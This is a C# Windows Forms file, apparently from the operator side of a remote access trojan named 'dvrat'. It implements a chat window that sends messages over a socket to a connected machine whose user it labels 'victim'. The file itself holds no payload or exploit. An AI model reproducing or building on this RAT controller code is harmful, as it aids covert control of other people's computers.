using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace dvrat
{
    public partial class ChatForm : Form
    {
        MainForm _parent;
        Socket _s;
        
        public ChatForm(Socket s,MainForm parent)
        {
            this._s = s;
            this._parent = parent;
            InitializeComponent();
        }
        private string send_to_client = "server_new_message;";


        private void chat_form_Load(object sender, EventArgs e)
        {
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }
        public void add_to_list(string message)
        {
            if (InvokeRequired)
            {
                listBox1.Invoke(new MethodInvoker(() =>
                {
                    listBox1.Items.Add($"victim: {message}");
                    listBox1.Refresh();
                }));
            }
            else
            {
                listBox1.Items.Add($"victim: {message}");
                listBox1.Refresh();
            }
        }
        private void send_button1_Click(object sender, EventArgs e)
        {
            listBox1.Items.Add($"Me: {message_textBox.Text}");
            send_to_client += message_textBox.Text;
            this._parent.send_to_client(this._s, send_to_client);
            message_textBox.Text = "";
            send_to_client = "server_new_message;";
        }

        private void chat_form_FormClosing(object sender, FormClosingEventArgs e)
        {
            this._parent.send_to_client(this._s, "end_chat;");
            this._parent.send_to_client(this._s, "close_chat;");
        }

        private void chat_form_FormClosed(object sender, FormClosedEventArgs e)
        {
            this._parent.send_to_client(this._s, "end_chat;");
            this._parent.send_to_client(this._s, "close_chat;");
        }
    }
}
